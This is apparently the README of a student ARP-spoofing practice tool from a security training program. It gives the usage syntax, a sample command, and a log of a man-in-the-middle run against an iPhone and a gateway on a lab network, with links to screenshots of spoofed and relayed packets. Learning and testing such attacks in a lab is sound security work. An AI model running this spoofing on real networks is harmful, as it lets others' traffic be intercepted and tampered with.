# arp-spoofing
arp spoofing practice
```
syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]
sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2
```
------------------------
## Sample execution
### Used devices
attacker (linux guest os) <br>
sender (iphone, KITRI_DEV) <br>
target (KITRI_DEV, iphone) <br>

### Log
```
oxdjww@oxdjww-virtual-machine:~/Desktop/gilgil/arp-spoofing$ sudo ./arp-spoof ens33 10.1.1.150 10.1.1.1 10.1.1.1 10.1.1.150

----------------------------------------
[*] arp-spoof #1..
----------------------------------------

----------------------------------------
[*] get host info..
----------------------------------------
[+] attackerIp   : 10.1.1.96
[+] attackerMac  : 00:0C:29:C9:33:3C

----------------------------------------
[*] get sender Info..
----------------------------------------

----------------------------------------
[*] Arp packet sending succeeded!
----------------------------------------
[+] senderIp    : 10.1.1.150
[+] senderMac   : AA:CA:47:90:49:E0

----------------------------------------
[*] get target Info..
----------------------------------------

----------------------------------------
[*] Arp packet sending succeeded!
----------------------------------------
[+] targetIp    : 10.1.1.1
[+] targetMac   : 88:36:6C:9F:83:3C

----------------------------------------
[*] arp-spoof #2..
----------------------------------------

----------------------------------------
[*] get host info..
----------------------------------------
[+] attackerIp   : 10.1.1.96
[+] attackerMac  : 00:0C:29:C9:33:3C

----------------------------------------
[*] get sender Info..
----------------------------------------

----------------------------------------
[*] Arp packet sending succeeded!
----------------------------------------
[+] senderIp    : 10.1.1.1
[+] senderMac   : 88:36:6C:9F:83:3C

----------------------------------------
[*] get target Info..
----------------------------------------

----------------------------------------
[*] Arp packet sending succeeded!
----------------------------------------
[+] targetIp    : 10.1.1.150
[+] targetMac   : AA:CA:47:90:49:E0

----------------------------------------
[*] Arp packet sending succeeded!
----------------------------------------

----------------------------------------
[*] Arp packet sending succeeded!
----------------------------------------

----------------------------------------
[*] Ip packet relaying succeeded!
----------------------------------------

----------------------------------------
[*] Ip packet relaying succeeded!
----------------------------------------

----------------------------------------
[*] Arp packet sending succeeded!
----------------------------------------
...
```

### References
#### Spoofed Ip packet (ICMP Request)
![infected_request](https://github.com/bob-12th/arp-spoofing/assets/102507306/0e4dc282-ff32-478b-955d-998721bd7c4e)
#### Relaying Ip packet (ICMP Request)
![relay_request](https://github.com/bob-12th/arp-spoofing/assets/102507306/082ba524-0ce0-4804-b27f-345e6c36a70c)
#### Receiving Ip packet (ICMP Reply)
![reply](https://github.com/bob-12th/arp-spoofing/assets/102507306/ea66d68b-0e9c-47b2-b110-545b211fbd04)

